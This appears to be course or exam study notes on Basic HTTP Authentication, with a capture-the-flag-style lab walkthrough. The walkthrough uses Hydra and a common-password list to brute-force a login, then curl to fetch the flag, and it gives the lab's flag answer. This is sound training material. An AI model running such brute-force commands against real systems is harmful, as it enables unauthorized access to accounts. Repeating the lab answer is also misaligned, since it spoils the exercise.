# Section 7 — Basic HTTP Authentication

---

## How Basic Auth Works

1. Browser requests a protected resource
2. Server responds `401 Unauthorized` + `WWW-Authenticate` header
3. Browser prompts for username/password
4. Browser Base64-encodes `username:password` and sends it in every request:

```
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

> Base64 is **not encryption** — it's trivially reversible. Basic Auth over HTTP (no TLS) exposes credentials in plaintext.

---

## Attacking Basic Auth with Hydra

Use the `http-get` module. Point it at the protected path.

### Command

```bash
hydra -l USERNAME -P WORDLIST TARGET http-get /PATH -s PORT -f
```

| Part | Purpose |
|------|---------|
| `-l USERNAME` | Single known username |
| `-P WORDLIST` | Password list to try |
| `http-get /PATH` | Service + protected path (use `/` for root) |
| `-s PORT` | Non-default port |
| `-f` | Stop after first valid password found |

---

## Lab — Basic HTTP Auth Brute Force

**Objective:** Brute-force a Basic Auth-protected page, then log in to retrieve the flag.

**Why `http-get`:** Basic Auth sends credentials via the `Authorization` header on GET requests — Hydra's `http-get` module handles this automatically.

**Why this wordlist:** 200 most-used passwords is tiny and fast. `Password@123` is exactly the kind of password a policy-compliant user picks — uppercase, lowercase, number, special char — and still ends up in common lists.

---

### Step 1 — Run Hydra

```bash
hydra -l basic-auth-user -P ~/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
  TARGET_IP http-get / -s TARGET_PORT -f
```

**Output:**
```
[PORT][http-get] host: TARGET_IP   login: basic-auth-user   password: Password@123
1 of 1 target successfully completed, 1 valid password found
```

---

### Step 2 — Retrieve the Flag

Once you have the password, authenticate with curl using `-u user:pass`:

```bash
curl -s -u basic-auth-user:Password@123 http://TARGET_IP:TARGET_PORT/
```

**Why `-u`:** curl's `-u` flag sends credentials as Basic Auth — same as the browser dialog. No need to manually Base64-encode.

**Result:**
```
You found the flag: HTB{th1s_1s_4_f4k3_fl4g}
```

**Q1 Answer:** `HTB{th1s_1s_4_f4k3_fl4g}`

---

## Exam Notes

- Basic Auth = credentials in every request header — intercept with Burp to confirm the format before attacking
- `http-get /` targets the root — adjust the path if the protected resource is elsewhere (e.g., `http-get /admin`)
- After cracking, use `curl -u user:pass URL` to retrieve content without a browser
- Wordlist order: `2023-200_most_used_passwords.txt` → `rockyou.txt` — start small
